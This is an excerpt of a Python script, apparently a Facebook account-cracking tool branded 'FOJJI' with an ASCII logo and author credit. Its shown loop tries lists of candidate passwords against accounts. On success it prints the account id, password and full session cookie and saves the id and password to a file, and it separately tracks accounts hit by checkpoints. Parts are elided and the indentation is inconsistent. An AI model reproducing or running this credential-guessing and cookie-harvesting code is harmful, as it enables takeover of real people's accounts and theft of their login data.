...
logo = """
         \033[1;37m d88888b  .d88b.     d88b    d88b 
         \033[1;37m 88'     .8P  Y8.    `8P'    `8P'   `88'
         \033[1;37m 88ooo   88    88     88      88     88
         \033[1;37m 88~~~   88    88     88      88     88
         \033[1;37m 88      `8b  d8' db. 88  db. 88    .88.
         \033[1;37m YP       `Y88P'  Y8888P  Y8888P  
         \033[1;37m YP       `Y88P'  Y8888P  Y8888P   \033[1;32m LPC\033[1;37m 
--------------------------------------------------
[•] AUTHOR     : \033[1;32mFojji\033[1;37m
...
def rehan():
	...
	if gh =='1':
		...
		os.system('xdg-open https://www.facebook.com/sonia.aliya.104?mibextid=ZbWKwL')
	elif gh =='0':
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[FOJJI-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                open('FOJJI-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                # print('\033[1;33m[FOJJI-CP] '+uid+' | '+ps+'\x1b[1;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mFOJJI\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
